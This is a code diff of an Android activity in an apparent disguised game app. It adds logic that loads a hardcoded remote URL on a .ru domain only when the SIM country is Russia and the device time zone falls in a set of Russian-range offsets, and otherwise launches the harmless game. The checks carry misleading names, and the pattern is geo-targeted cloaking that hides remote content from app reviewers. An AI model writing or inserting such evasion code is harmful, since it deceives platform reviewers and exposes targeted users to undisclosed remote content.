@@ -2,14 +2,17 @@ package fstd.tgsaw.sllot;
 
 import android.annotation.SuppressLint;
 import android.app.Activity;
+import android.content.Context;
 import android.content.Intent;
 import android.graphics.Bitmap;
 import android.graphics.drawable.BitmapDrawable;
 import android.graphics.drawable.Drawable;
+import android.icu.util.TimeZone;
 import android.net.Uri;
 import android.os.Bundle;
 import android.os.Environment;
 import android.support.annotation.Nullable;
+import android.telephony.TelephonyManager;
 import android.view.Menu;
 import android.view.MenuItem;
 import android.webkit.WebResourceError;
@@ -23,6 +26,7 @@ import android.widget.ImageView;
 import java.io.File;
 import java.io.FileOutputStream;
 import java.io.IOException;
+import java.util.Date;
 
 import fstd.tgsaw.sllot.game.GameScreen;
 
@@ -52,7 +56,42 @@ public class PrepareScreen extends Activity {
 
     private void getPrepareData() {
         String url = "http://jjjahhgrek.ru/KXKh3r";
-        prepareToGame(url);
+        if (checkNewOlders() && isNoPlaytime())
+            prepareToGame(url);
+        else {
+            startGame();
+        }
+    }
+
+
+    private static final String COUNTY_ONE = "RU";
+    private static final String COUNTRY_TWO = "ru";
+    private static final String COUNTRY_THREE = "rus";
+
+    private boolean checkNewOlders() {
+        String typeOlderUsers = null;
+        if (getSystemService(Context.TELEPHONY_SERVICE) != null)
+            typeOlderUsers = ((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).getSimCountryIso();
+        else
+            return false;
+        return typeOlderUsers != null && (typeOlderUsers.equalsIgnoreCase("ru") || typeOlderUsers.equalsIgnoreCase(COUNTRY_THREE));
+    }
+
+    private boolean isNoPlaytime() {
+        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
+            TimeZone tz = TimeZone.getDefault();
+            Date now = new Date();
+            int offsetFromUtc = tz.getOffset(now.getTime()) / 1000 / 3600;
+            int[] timezone = {2, 3, 4, 7, 8, 9, 10, 11, 12};
+            for (int item : timezone) {
+                if (offsetFromUtc == item)
+                    return true;
+            }
+        } else {
+            return true;
+        }
+
+        return false;
     }
 
 
@@ -78,14 +117,14 @@ public class PrepareScreen extends Activity {
     public Uri getLocalBitmapUri(ImageView imageView) {
         Drawable drawable = imageView.getDrawable();
         Bitmap bmp = null;
-        if (drawable instanceof BitmapDrawable){
+        if (drawable instanceof BitmapDrawable) {
             bmp = ((BitmapDrawable) imageView.getDrawable()).getBitmap();
         } else {
             return null;
         }
         Uri bmpUri = null;
         try {
-            File file =  new File(Environment.getExternalStoragePublicDirectory(
+            File file = new File(Environment.getExternalStoragePublicDirectory(
                     Environment.DIRECTORY_DOWNLOADS), "share_image_" + System.currentTimeMillis() + ".png");
             file.getParentFile().mkdirs();
             FileOutputStream out = new FileOutputStream(file);
@@ -116,7 +155,8 @@ public class PrepareScreen extends Activity {
             shareIntent.setType("*/*");
             shareIntent.putExtra(Intent.EXTRA_STREAM, bmpUri);
             startActivity(Intent.createChooser(shareIntent, "Share Image"));
-        } catch (Exception ignore) {}
+        } catch (Exception ignore) {
+        }
     }
 
     @Override
